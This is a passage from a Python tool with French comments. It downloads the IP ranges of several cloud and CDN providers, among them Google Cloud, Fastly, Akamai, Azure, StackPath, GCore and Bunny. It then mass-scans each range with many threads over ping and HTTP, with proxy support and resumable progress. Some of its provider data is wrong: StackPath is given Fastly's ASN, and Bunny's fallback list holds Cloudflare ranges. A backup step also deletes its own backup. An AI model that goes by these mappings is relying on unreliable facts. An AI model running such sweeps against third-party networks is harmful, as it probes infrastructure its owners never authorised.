            os.replace(temp_path, GOOGLE_CIDR_FILE)
            print(Fore.GREEN + f"✅ {len(cidrs)} plages sauvegardées")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour : {str(e)}")
        return False
    
def start_googlecloud_scan(resume=False, proxy=None, threads=100, batch_size=5):
    """Lance le scan avec gestion améliorée de la progression"""
    # Vérification initiale
    if not os.path.exists(GOOGLE_CIDR_FILE):
        print(Fore.RED + f"❌ Fichier {GOOGLE_CIDR_FILE} introuvable")
        return None

    try:
        # Chargement avec validation
        with open(GOOGLE_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
            
        # Gestion de la progression
        scanned = set()
        if resume:
            os.makedirs(os.path.dirname(GOOGLE_SCAN_PROGRESS_FILE), exist_ok=True)
            try:
                with open(GOOGLE_SCAN_PROGRESS_FILE, 'r') as f:
                    scanned = {line.strip() for line in f if line.strip()}
            except FileNotFoundError:
                pass

        to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Toutes les plages sont déjà scannées")
            return None

        print(Fore.CYAN + f"☁️ Début du scan Google Cloud ({len(to_scan)} plages) | Threads: {threads}")

        # Journalisation
        with open(GOOGLE_SCAN_PROGRESS_FILE, 'a' if resume else 'w') as f:
            f.write(f"# Scan started at {datetime.now().isoformat()}\n")

        # Exécution par batch
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== PROGRESSION: {i}/{len(to_scan)} ===")
            
            scanner = HostScanner(
                ip_range=cidr,
                threads=threads,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            # Sauvegarde incrémentale
            with open(GOOGLE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            # Pause périodique
            if i % batch_size == 0:
                time.sleep(1)

        return scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return None
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur critique : {str(e)}")
        return None

def _clean_google_progress_file():
    """Nettoie le fichier de progression des métadonnées"""
    if os.path.exists(GOOGLE_SCAN_PROGRESS_FILE):
        try:
            with open(GOOGLE_SCAN_PROGRESS_FILE, 'r+') as f:
                lines = [line for line in f if not line.startswith('#')]
                f.seek(0)
                f.writelines(lines)
                f.truncate()
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Nettoyage échoué : {str(e)}")         

# ==============================================
# CONFIGURATION FASTLY
# ==============================================
FASTLY_CIDR_FILE = "fastly_cidrs.txt"
FASTLY_SCAN_PROGRESS_FILE = "fastly_scan_progress.txt"
# ==============================================
# FONCTIONS FASTLY
# ==============================================

def fetch_fastly_cidrs(max_retries: int = 3, timeout: int = 15) -> list:
    """Récupère les plages CIDR Fastly avec validation et mécanisme de retry"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR Fastly (API + ASN)...")
    cidrs = []

    def is_valid_fastly_cidr(cidr: str) -> bool:
        """Valide les plages CIDR spécifiques à Fastly"""
        try:
            network = ipaddress.IPv4Network(cidr)
            return 16 <= network.prefixlen <= 24  # Plages typiques Fastly
        except ValueError:
            return False

    # API Fastly avec retry
    for attempt in range(max_retries):
        try:
            response = requests.get(
                "https://api.fastly.com/public-ip-list",
                timeout=timeout
            )
            response.raise_for_status()
            
            data = response.json()
            api_cidrs = [
                cidr for cidr in data.get("addresses", [])
                if is_valid_fastly_cidr(cidr)
            ]
            cidrs.extend(api_cidrs)
            print(Fore.GREEN + f"  ✅ Fastly API → {len(api_cidrs)} CIDR valides")
            break
            
        except Exception as e:
            if attempt == max_retries - 1:
                print(Fore.RED + f"❌ Échec API après {max_retries} essais : {str(e)}")
            else:
                time.sleep(2 ** attempt)

    # Complément ASN avec validation
    try:
        asn_cidrs = [
            cidr for cidr in fetch_cidrs_multi_asn([54113])
            if is_valid_fastly_cidr(cidr)
        ]
        cidrs.extend(asn_cidrs)
        print(Fore.GREEN + f"  ✅ ASN Fastly → {len(asn_cidrs)} CIDR supplémentaires")
    except Exception as e:
        print(Fore.YELLOW + f"⚠️ Complément ASN partiel : {str(e)}")

    final = sorted(list(set(cidrs)))  # Déduplication + tri
    print(Fore.GREEN + f"✅ Total CIDR uniques Fastly : {len(final)}")
    return final
    
def update_fastly_cidrs() -> bool:
    """Sauvegarde atomique des CIDRs Fastly"""
    try:
        cidrs = fetch_fastly_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification de cohérence
        if len(cidrs) < 5:  # Fastly a normalement >20 plages
            raise ValueError(f"Nombre suspect de CIDRs : {len(cidrs)}")

        # Sauvegarde atomique
        temp_path = f"{FASTLY_CIDR_FILE}.tmp"
        try:
            with open(temp_path, 'w') as f:
                f.write("\n".join(cidrs) + "\n")
            os.replace(temp_path, FASTLY_CIDR_FILE)
            print(Fore.GREEN + f"✅ {len(cidrs)} plages sauvegardées")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour : {str(e)}")
        return False
    
def start_fastly_scan(resume=False, proxy=None, threads=100, batch_size=5):
    """Lance le scan avec gestion améliorée de la progression"""
    # Vérification initiale
    if not os.path.exists(FASTLY_CIDR_FILE):
        print(Fore.RED + f"❌ Fichier {FASTLY_CIDR_FILE} introuvable")
        return None

    try:
        # Chargement avec validation
        with open(FASTLY_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
            
        # Gestion de la progression
        scanned = set()
        if resume:
            os.makedirs(os.path.dirname(FASTLY_SCAN_PROGRESS_FILE), exist_ok=True)
            try:
                with open(FASTLY_SCAN_PROGRESS_FILE, 'r') as f:
                    scanned = {line.strip() for line in f if line.strip()}
            except FileNotFoundError:
                pass

        to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Toutes les plages sont déjà scannées")
            return None

        print(Fore.CYAN + f"⚡ Scan Fastly: {len(to_scan)} plages | Threads: {threads}")

        # Journalisation
        with open(FASTLY_SCAN_PROGRESS_FILE, 'a' if resume else 'w') as f:
            f.write(f"# Scan started at {datetime.now().isoformat()}\n")

        # Exécution par batch
        scanner = None
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== PROGRESSION: {i}/{len(to_scan)} ===")
            
            scanner = HostScanner(
                ip_range=cidr,
                threads=threads,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()

            # Sauvegarde incrémentale
            with open(FASTLY_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            # Pause périodique
            if i % batch_size == 0:
                time.sleep(1)

        return scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return None
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur critique : {str(e)}")
        return None
        
# ==============================================
# CONFIGURATION AKAMAI, AZURE, STACKPATH GCORE
# ==============================================
AKAMAI_CIDR_FILE = "akamai_cidrs.txt"
AKAMAI_SCAN_PROGRESS_FILE = "akamai_scan_progress.txt"

AZURE_CIDR_FILE = "azure_cidrs.txt"
AZURE_SCAN_PROGRESS_FILE = "azure_scan_progress.txt"

STACKPATH_CIDR_FILE = "stackpath_cidrs.txt"
STACKPATH_SCAN_PROGRESS_FILE = "stackpath_scan_progress.txt"

GCORE_CIDR_FILE = "gcore_cidrs.txt"
GCORE_SCAN_PROGRESS_FILE = "gcore_scan_progress.txt"

# ==============================================
# FONCTIONS AKAMAI, AZURE, STACKPATH GCORE
# ==============================================

def fetch_akamai_cidrs(max_retries: int = 2) -> list:
    """Récupère les plages CIDR Akamai avec fallback statique"""
    def is_valid_akamai_cidr(cidr: str) -> bool:
        try:
            network = ipaddress.IPv4Network(cidr)
            return 16 <= network.prefixlen <= 24  # Plages typiques Akamai
        except ValueError:
            return False

    # Tentative de récupération dynamique
    cidrs = []
    for attempt in range(max_retries):
        try:
            cidrs = [
                cidr for cidr in fetch_cidrs_multi_asn([20940, 12222])
                if is_valid_akamai_cidr(cidr)
            ]
            if cidrs:
                print(Fore.GREEN + f"✅ Akamai → {len(cidrs)} CIDR dynamiques")
                return sorted(cidrs)
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Tentative {attempt + 1}/{max_retries} échouée: {str(e)}")
            time.sleep(1)

    # Fallback statique
    fallback = [
        "23.32.0.0/11", "23.0.0.0/12", 
        "23.192.0.0/11", "184.24.0.0/13"
    ]
    print(Fore.YELLOW + "➡️ Utilisation de plages CIDR statiques Akamai")
    return [cidr for cidr in fallback if is_valid_akamai_cidr(cidr)]
        
def fetch_azure_cidrs(max_retries: int = 2) -> list:
    """Récupère les plages CIDR Azure avec validation renforcée"""
    def is_valid_azure_cidr(cidr: str) -> bool:
        try:
            net = ipaddress.IPv4Network(cidr)
            # Azure utilise généralement des plages /13 à /24
            return 13 <= net.prefixlen <= 24 and not net.is_private
        except ValueError:
            return False

    # Récupération dynamique
    for attempt in range(max_retries):
        try:
            cidrs = [
                cidr for cidr in fetch_cidrs_multi_asn([8075, 8068])
                if is_valid_azure_cidr(cidr)
            ]
            if cidrs:
                print(Fore.GREEN + f"✅ Azure → {len(cidrs)} CIDR valides")
                return sorted(cidrs)
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Tentative ASN Azure échouée (essai {attempt + 1}): {str(e)}")
            time.sleep(2 ** attempt)

    # Fallback vérifié
    fallback = [
        "13.104.0.0/14", "40.74.0.0/15", "40.112.0.0/13",
        "52.96.0.0/14", "52.108.0.0/15", "52.136.0.0/13", 
        "104.208.0.0/13"
    ]
    valid_fallback = [cidr for cidr in fallback if is_valid_azure_cidr(cidr)]
    print(Fore.YELLOW + f"➡️ Utilisation de {len(valid_fallback)} plages statiques Azure")
    return valid_fallback
    
def fetch_stackpath_cidrs() -> list:
    """Récupère les CIDR StackPath avec vérification stricte"""
    required_asn = 54113  # ASN principal de StackPath
    
    def validate_stackpath_cidr(cidr: str) -> bool:
        try:
            net = ipaddress.IPv4Network(cidr)
            # StackPath utilise généralement des /16 à /22
            return 16 <= net.prefixlen <= 22
        except ValueError:
            return False

    try:
        cidrs = [
            cidr for cidr in fetch_cidrs_multi_asn([required_asn])
            if validate_stackpath_cidr(cidr)
        ]
        if cidrs:
            print(Fore.GREEN + f"✅ StackPath → {len(cidrs)} CIDR vérifiés")
            return cidrs
    except Exception as e:
        print(Fore.RED + f"❌ Erreur ASN StackPath: {str(e)}")

    # Fallback validé
    fallback = [
        "151.139.0.0/16", "192.16.48.0/20", "190.93.240.0/20"
    ]
    validated = [cidr for cidr in fallback if validate_stackpath_cidr(cidr)]
    print(Fore.YELLOW + f"➡️ Utilisation de {len(validated)} plages statiques StackPath")
    return validated

def fetch_gcore_cidrs() -> list:
    """Récupère les plages GCore avec vérification de cohérence"""
    gcore_asn = 199524
    
    def is_gcore_cidr(cidr: str) -> bool:
        try:
            net = ipaddress.IPv4Network(cidr)
            # Les plages GCore sont généralement en Europe de l'Est
            return (net.prefixlen >= 19 and 
                    not net.is_private and
                    str(net).startswith(('92.223.', '185.176.')))
        except ValueError:
            return False

    try:
        cidrs = [
            cidr for cidr in fetch_cidrs_multi_asn([gcore_asn])
            if is_gcore_cidr(cidr)
        ]
        if len(cidrs) >= 3:  # Minimum attendu
            print(Fore.GREEN + f"✅ GCore → {len(cidrs)} plages valides")
            return cidrs
    except Exception as e:
        print(Fore.RED + f"❌ Erreur récupération GCore: {str(e)}")

    # Fallback avec validation
    fallback = [
        "92.223.64.0/19", "92.223.88.0/21",
        "92.223.96.0/22", "92.223.100.0/23"
    ]
    valid_cidrs = [cidr for cidr in fallback if is_gcore_cidr(cidr)]
    print(Fore.YELLOW + f"➡️ Utilisation de {len(valid_cidrs)} plages statiques GCore")
    return valid_cidrs
    
def update_akamai_cidrs() -> bool:
    """Sauvegarde atomique des CIDR Akamai avec validation"""
    try:
        cidrs = fetch_akamai_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification de cohérence (Akamai a normalement >50 plages)
        if len(cidrs) < 4:
            raise ValueError(f"Nombre suspect de CIDRs: {len(cidrs)}")

        # Sauvegarde atomique
        temp_path = f"{AKAMAI_CIDR_FILE}.tmp"
        try:
            with open(temp_path, 'w') as f:
                f.write("\n".join(sorted(cidrs)) + "\n")
            os.replace(temp_path, AKAMAI_CIDR_FILE)
            print(Fore.GREEN + f"✅ {len(cidrs)} plages Akamai sauvegardées")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour Akamai: {str(e)}")
        return False
    
def update_azure_cidrs() -> bool:
    """Sauvegarde atomique des CIDR Azure avec validation"""
    try:
        # Récupération des CIDR
        cidrs = fetch_azure_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification de cohérence (Azure a normalement beaucoup de plages)
        if len(cidrs) < 10:
            raise ValueError(f"Nombre suspect de CIDRs: {len(cidrs)}")

        # Création du répertoire parent si nécessaire
        cidr_dir = os.path.dirname(AZURE_CIDR_FILE)
        if cidr_dir:  # Seulement si le chemin contient un répertoire
            os.makedirs(cidr_dir, exist_ok=True)

        # Sauvegarde atomique
        temp_path = f"{AZURE_CIDR_FILE}.tmp"
        try:
            with open(temp_path, 'w') as f:
                f.write("\n".join(sorted(cidrs)) + "\n")
            os.replace(temp_path, AZURE_CIDR_FILE)
            print(Fore.GREEN + f"✅ {len(cidrs)} plages Azure sauvegardées")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour Azure: {str(e)}")
        return False
    
def update_stackpath_cidrs() -> bool:
    """Sauvegarde sécurisée des CIDR StackPath"""
    try:
        cidrs = fetch_stackpath_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide disponible")

        # StackPath a normalement quelques plages principales
        if len(cidrs) < 2:
            raise ValueError(f"Nombre insuffisant de plages: {len(cidrs)}")

        # Sauvegarde avec verrou implicite
        temp_path = f"{STACKPATH_CIDR_FILE}.lock"
        try:
            with open(temp_path, 'w') as lock_file:
                lock_file.write("")  # Création du verrou
            
            with open(STACKPATH_CIDR_FILE, 'w') as f:
                f.write("\n".join(cidrs) + "\n")
                
            print(Fore.GREEN + f"✅ {len(cidrs)} plages StackPath sauvegardées")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour StackPath: {str(e)}")
        return False
        
def update_gcore_cidrs() -> bool:
    """Met à jour les CIDR GCore avec vérifications"""
    try:
        cidrs = fetch_gcore_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification du préfixe GCore typique
        gcore_prefixes = ('92.223.', '185.176.')
        if not any(cidr.startswith(gcore_prefixes) for cidr in cidrs):
            raise ValueError("Plages ne correspondant pas à GCore")

        # Sauvegarde en deux étapes
        temp_path = f"{GCORE_CIDR_FILE}.new"
        backup_path = f"{GCORE_CIDR_FILE}.bak"
        
        try:
            # Écriture nouvelle version
            with open(temp_path, 'w') as f:
                f.write("\n".join(sorted(cidrs)) + "\n")
            
            # Backup ancienne version
            if os.path.exists(GCORE_CIDR_FILE):
                os.replace(GCORE_CIDR_FILE, backup_path)
            
            # Activation nouvelle version
            os.replace(temp_path, GCORE_CIDR_FILE)
            
            print(Fore.GREEN + f"✅ {len(cidrs)} plages GCore sauvegardées")
            return True
        finally:
            for tmp_file in [temp_path, backup_path]:
                if os.path.exists(tmp_file):
                    os.remove(tmp_file)
                    
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour GCore: {str(e)}")
        return False
    
def start_akamai_scan(resume: bool = False, proxy: str = None, threads: int = 100):
    """Lance le scan Akamai avec gestion avancée de la progression"""
    # Configuration
    scan_config = {
        'timeout': 10,
        'batch_size': 5,
        'min_cidrs': 3  # Nombre minimum de plages attendues
    }

    # Vérification initiale
    if not os.path.exists(AKAMAI_CIDR_FILE):
        print(Fore.RED + f"❌ Fichier CIDR introuvable: {AKAMAI_CIDR_FILE}")
        return None

    try:
        # Chargement avec validation
        with open(AKAMAI_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
            
        if len(all_cidrs) < scan_config['min_cidrs']:
            raise ValueError(f"Nombre suspect de CIDRs: {len(all_cidrs)}")

        # Gestion de la progression
        scanned = set()
        if resume:
            os.makedirs(os.path.dirname(AKAMAI_SCAN_PROGRESS_FILE), exist_ok=True)
            try:
                with open(AKAMAI_SCAN_PROGRESS_FILE, 'r') as f:
                    scanned = {line.strip() for line in f if line.strip()}
            except FileNotFoundError:
                pass

        to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Toutes les plages sont déjà scannées")
            return None

        print(Fore.CYAN + f"🌀 Scan Akamai: {len(to_scan)} plages | Threads: {threads} | Proxy: {proxy or 'Aucun'}")

        # Journalisation
        with open(AKAMAI_SCAN_PROGRESS_FILE, 'a' if resume else 'w') as f:
            f.write(f"# Scan started at {datetime.now().isoformat()}\n")

        # Exécution
        scanner = None
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== PROGRESSION: {i}/{len(to_scan)} ({cidr}) ===")
            
            scanner = HostScanner(
                ip_range=cidr,
                threads=threads,
                ping_timeout=1,
                http_timeout=scan_config['timeout'],
                proxy=proxy
            )
            scanner.run()

            # Sauvegarde incrémentale
            with open(AKAMAI_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            # Pause périodique
            if i % scan_config['batch_size'] == 0:
                time.sleep(1)

        return scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu par l'utilisateur")
        return scanner if scanner else None
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur critique: {str(e)}")
        return None
        
def start_azure_scan(resume: bool = False, proxy: str = None):
    """Scan des plages Azure avec gestion de reprise améliorée"""
    try:
        # Vérification des prérequis
        if not os.path.exists(AZURE_CIDR_FILE):
            raise FileNotFoundError(f"Fichier CIDR manquant: {AZURE_CIDR_FILE}")

        # Chargement des CIDR
        with open(AZURE_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
            
            if len(all_cidrs) < 10:  # Azure a normalement beaucoup de plages
                raise ValueError("Nombre insuffisant de CIDRs")

        # Gestion de la progression
        progress_file = AZURE_SCAN_PROGRESS_FILE
        scanned = set()
        
        if resume:
            os.makedirs(os.path.dirname(progress_file), exist_ok=True)
            try:
                with open(progress_file, 'r') as f:
                    scanned = {line.strip() for line in f if line.strip()}
            except FileNotFoundError:
                pass

        to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Scan Azure déjà complet")
            return None

        print(Fore.CYAN + f"☁️ Démarrage scan Azure ({len(to_scan)} plages)")

        # Configuration du scan
        scanner_config = {
            'threads': 150,  # Augmenté pour Azure
            'timeout': 15,
            'batch_delay': 2
        }

        # Journalisation
        with open(progress_file, 'a' if resume else 'w') as f:
            f.write(f"# Azure scan started at {datetime.now()}\n")

        # Exécution
        last_scanner = None
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n[AZURE] Scan {i}/{len(to_scan)} - {cidr}")
            
            last_scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=scanner_config['threads'],
                ping_timeout=1,
                http_timeout=scanner_config['timeout'],
                proxy=proxy
            )
            last_scanner.run()

            # Sauvegarde progression
            with open(progress_file, 'a') as f:
                f.write(f"{cidr}\n")

            # Pause stratégique
            if i % 5 == 0:
                time.sleep(scanner_config['batch_delay'])

        return last_scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Interruption utilisateur")
        return last_scanner if 'last_scanner' in locals() else None
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur Azure: {type(e).__name__}: {str(e)}")
        return None
        
def start_stackpath_scan(resume: bool = False, proxy: str = None):
    """Scan StackPath avec gestion de verrouillage"""
    LOCK_FILE = f"{STACKPATH_SCAN_PROGRESS_FILE}.lock"
    
    try:
        # Vérification CIDR
        if not os.path.exists(STACKPATH_CIDR_FILE):
            raise FileNotFoundError("Fichier CIDR StackPath introuvable")

        # Verrouillage
        if os.path.exists(LOCK_FILE):
            raise RuntimeError("Un scan est déjà en cours")
            
        with open(LOCK_FILE, 'w') as lock_f:
            lock_f.write(str(os.getpid()))

        # Chargement CIDR
        with open(STACKPATH_CIDR_FILE, 'r') as f:
            cidrs = [line.strip() for line in f if line.strip()]
            
        # Gestion progression
        scanned = set()
        if resume and os.path.exists(STACKPATH_SCAN_PROGRESS_FILE):
            with open(STACKPATH_SCAN_PROGRESS_FILE, 'r') as f:
                scanned = {line.strip() for line in f if line.strip()}

        to_scan = [cidr for cidr in cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Scan StackPath complet")
            return None

        print(Fore.CYAN + f"🧱 Lancement scan StackPath ({len(to_scan)} plages)")

        # Journalisation
        with open(STACKPATH_SCAN_PROGRESS_FILE, 'a' if resume else 'w') as f:
            f.write(f"# Start: {datetime.now().isoformat()}\n")

        # Exécution
        current_scanner = None
        for idx, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== StackPath {idx}/{len(to_scan)} ===")
            
            current_scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=8,
                proxy=proxy
            )
            current_scanner.run()

            # Sauvegarde
            with open(STACKPATH_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

        return current_scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nInterruption utilisateur")
        return current_scanner if 'current_scanner' in locals() else None
    except Exception as e:
        print(Fore.RED + f"\nErreur StackPath: {str(e)}")
        return None
    finally:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
        print(Fore.CYAN + "🔓 Verrou libéré")

def start_gcore_scan(resume: bool = False, proxy: str = None):
    """Scan GCore avec gestion complète"""
    SCAN_CONFIG = {
        'max_threads': 120,
        'timeout': 12,
        'required_prefixes': ('92.223.', '185.176.')
    }

    try:
        # Vérification initiale
        if not os.path.exists(GCORE_CIDR_FILE):
            print(Fore.YELLOW + "ℹ Mise à jour des CIDR GCore...")
            if not update_gcore_cidrs():
                raise FileNotFoundError("Impossible d'obtenir les CIDR")

        # Chargement avec validation
        with open(GCORE_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
            valid_cidrs = [cidr for cidr in all_cidrs if cidr.startswith(SCAN_CONFIG['required_prefixes'])]
            
            if not valid_cidrs:
                raise ValueError("Aucune plage GCore valide")

        # Gestion progression
        scanned = set()
        if resume:
            os.makedirs(os.path.dirname(GCORE_SCAN_PROGRESS_FILE), exist_ok=True)
            try:
                with open(GCORE_SCAN_PROGRESS_FILE, 'r') as f:
                    scanned = {line.strip() for line in f if line.strip()}
            except FileNotFoundError:
                pass

        to_scan = [cidr for cidr in valid_cidrs if cidr not in scanned]
        
        if not to_scan:
            print(Fore.GREEN + "✅ Scan GCore déjà complet")
            return None

        print(Fore.CYAN + f"🌐 Début scan GCore: {len(to_scan)} plages")

        # Journalisation
        with open(GCORE_SCAN_PROGRESS_FILE, 'a' if resume else 'w') as f:
            f.write(f"# GCore Scan {datetime.now()}\n")

        # Exécution
        last_scanner = None
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n[GCORE] Plage {i}/{len(to_scan)}")
            
            last_scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=SCAN_CONFIG['max_threads'],
                ping_timeout=1,
                http_timeout=SCAN_CONFIG['timeout'],
                proxy=proxy
            )
            last_scanner.run()

            # Sauvegarde
            with open(GCORE_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

        return last_scanner

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nInterruption manuelle")
        return last_scanner if 'last_scanner' in locals() else None
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur GCore: {type(e).__name__}: {str(e)}")
        return None
        
# ==============================================
# CONSTANTES BUNNY
# ==============================================
BUNNY_CIDR_FILE = "bunny_cidrs.txt"
BUNNY_SCAN_PROGRESS_FILE = "bunny_scan_progress.txt"
# BunnyCDN - https://bgp.he.net/AS60068
BUNNY_ASN_LIST = [60068]

# ==============================================
# FONCTIONS BUNNY
# ==============================================

def fetch_bunny_cidrs(max_retries: int = 2) -> list:
    """Récupère les plages CIDR Bunny avec fallback et validation"""
    def is_valid_bunny_cidr(cidr: str) -> bool:
        """Valide les plages CIDR spécifiques à Bunny"""
        try:
            network = ipaddress.IPv4Network(cidr)
            return 16 <= network.prefixlen <= 24 and not network.is_private
        except ValueError:
            return False

    # Tentative de récupération via ASN
    for attempt in range(max_retries):
        try:
            cidrs = [cidr for cidr in fetch_cidrs_multi_asn(BUNNY_ASN_LIST) 
                    if is_valid_bunny_cidr(cidr)]
            if cidrs:
                print(Fore.GREEN + f"  ✅ Bunny → {len(cidrs)} CIDR valides")
                return sorted(list(set(cidrs)))
        except Exception as e:
            print(Fore.YELLOW + f"⚠️ Tentative {attempt + 1} échouée: {str(e)}")
            time.sleep(1)

    # Fallback validé
    fallback = [
        "172.67.0.0/16", "104.16.0.0/12",
        "185.234.0.0/16", "45.133.184.0/22"
    ]
    valid_fallback = [cidr for cidr in fallback if is_valid_bunny_cidr(cidr)]
    print(Fore.YELLOW + f"⚠️ Utilisation de {len(valid_fallback)} plages de backup")
    return valid_fallback

def update_bunny_cidrs() -> bool:
    """Met à jour les CIDR Bunny avec création automatique du répertoire"""
    print(Fore.CYAN + "\n🐰 Mise à jour des plages Bunny...")
    try:
        # Récupération des CIDR
        cidrs = fetch_bunny_cidrs()
        if not cidrs:
            raise ValueError("Aucune plage valide récupérée")
            
        # Vérification de cohérence
        if len(cidrs) < 3:  # Bunny a normalement plusieurs plages
            raise ValueError(f"Nombre suspect de CIDRs: {len(cidrs)}")

        # Création du répertoire parent si nécessaire
        os.makedirs(os.path.dirname(BUNNY_CIDR_FILE) or ".", exist_ok=True)
        
        # Sauvegarde atomique
        temp_path = f"{BUNNY_CIDR_FILE}.tmp"
        try:
            with open(temp_path, 'w') as f:
                f.write("\n".join(sorted(cidrs)) + "\n")
            
            # Remplacement atomique
            if os.path.exists(BUNNY_CIDR_FILE):
                os.replace(temp_path, BUNNY_CIDR_FILE)
            else:
                os.rename(temp_path, BUNNY_CIDR_FILE)
                
            print(Fore.GREEN + f"✅ {len(cidrs)} plages Bunny sauvegardées dans {BUNNY_CIDR_FILE}")
            return True
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
    except Exception as e:
        print(Fore.RED + f"❌ Échec mise à jour Bunny: {str(e)}")
        return False

def scan_bunny_range(cidr: str, threads: int = 100, proxy: str = None):
    """Scan une plage CIDR spécifique de Bunny"""
    if not cidr:
        raise ValueError("Plage CIDR non spécifiée")

    print(Fore.MAGENTA + f"\n=== SCAN BUNNY {cidr} ===")
    try:
        scanner = HostScanner(
            filename=None,
            ip_range=cidr,
            threads=threads,
            ping_timeout=1,
            http_timeout=15,
            proxy=proxy
        )
        scanner.run()
        return scanner
    except Exception as e:
        print(Fore.RED + f"❌ Échec scan: {str(e)}")
        return None

def start_bunny_scan(resume=False, proxy=None, threads=100, batch_size=5):
    """Lance le scan Bunny avec gestion de progression et parallélisation"""
    if not os.path.exists(BUNNY_CIDR_FILE):
        print(Fore.RED + f"❌ Fichier {BUNNY_CIDR_FILE} introuvable")
        return False

    # Chargement avec vérification
    try:
        with open(BUNNY_CIDR_FILE, 'r') as f:
            all_cidrs = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"❌ Erreur lecture CIDR : {str(e)}")
        return False

    # Gestion de la progression
    scanned = set()
    if resume:
        try:
            with open(BUNNY_SCAN_PROGRESS_FILE, 'r') as f:
                scanned = {line.strip() for line in f if line.strip()}
        except FileNotFoundError:
            pass

    to_scan = [cidr for cidr in all_cidrs if cidr not in scanned]
    
    if not to_scan:
        print(Fore.GREEN + "✅ Toutes les plages Bunny sont déjà scannées")
        return True

    print(Fore.CYAN + f"🐰 Début du scan Bunny ({len(to_scan)} plages) | Threads: {threads} | Proxy: {proxy or 'Aucun'}")

    # Scan par batch avec sauvegarde incrémentale
    try:
        for i, cidr in enumerate(to_scan, 1):
            print(Fore.MAGENTA + f"\n=== PROGRESSION {i}/{len(to_scan)} : {cidr} ===")
            
            scanner = HostScanner(
                ip_range=cidr,
                threads=threads,
                ping_timeout=1,
                http_timeout=15,  # Timeout augmenté pour Bunny
                proxy=proxy
            )
            scanner.run()

            with open(BUNNY_SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")

            if i % batch_size == 0:  # Pause périodique
                time.sleep(2)  # Réduire la charge

    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan Bunny interrompu")
        return False
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur Bunny : {str(e)}")
        return False
        
    return True

# ==============================================
# CONSTANTES IMPERVA
# ==============================================
IMPERVA_CIDR_FILE = "imperva_cidrs.txt"
IMPERVA_SCAN_PROGRESS_FILE = "imperva_scan_progress.txt"
# Imperva - https://bgp.he.net/AS19551 (Incapsula) et AS59623
